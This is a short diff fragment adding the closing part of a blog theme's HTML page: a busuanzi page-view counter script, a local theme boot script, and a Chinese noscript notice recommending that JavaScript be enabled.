+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
